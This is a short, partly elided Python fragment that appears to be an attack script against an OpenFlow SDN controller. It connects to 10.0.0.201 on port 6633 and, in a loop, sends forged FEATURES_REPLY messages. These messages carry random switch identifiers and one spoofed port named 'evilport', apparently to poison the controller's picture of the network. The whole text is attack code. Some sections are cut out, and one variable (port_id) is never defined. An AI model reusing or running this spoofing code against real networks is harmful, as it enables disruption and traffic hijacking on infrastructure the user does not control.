...
dIP="10.0.0.201"
dPort=6633
ethMAC="\xee\xff\x00\x11\x22\x33"
bridge_id="port"
...
evilbridge_id="evilport"
evilport_id=evilbridge_id + ('\x00' * (16-len(bridge_id)))
while True:
	...
	resp=s.recv(2048)
	s.send('\x01\x06\x00\x50' + resp[4:8]
	+ '\xab\xab' + str(RandMAC()) + '\x00\x00\x01\x00' + '\xfe' + ('\x00'*3)
	+ '\x00\x00\x00\xc7' + '\x00\x00\x0f\xff'
	+ '\xff\xfe' + ethMAC + port_id + ('\x00'*2) + '\x00\x01\x00\x00\x00\x01'
	+ ('\x00' * 16))
	s.recv(2048)
	...
	resp=s.recv(2048)
	s.send('\x01\x06\x00\x50' + resp[4:8]
	+ '\xcd\xcd' + str(RandMAC()) + '\x00\x00\x01\x00' + '\xfe' + ('\x00'*3)
	+ '\x00\x00\x00\xc7' + '\x00\x00\x0f\xff'
	+ '\xff\xfe' + str(RandMAC()) + evilport_id + ('\x00'*2) + '\x00\x01\x00\x00\x00\x01'
	+ ('\x00' * 16))
	s.close()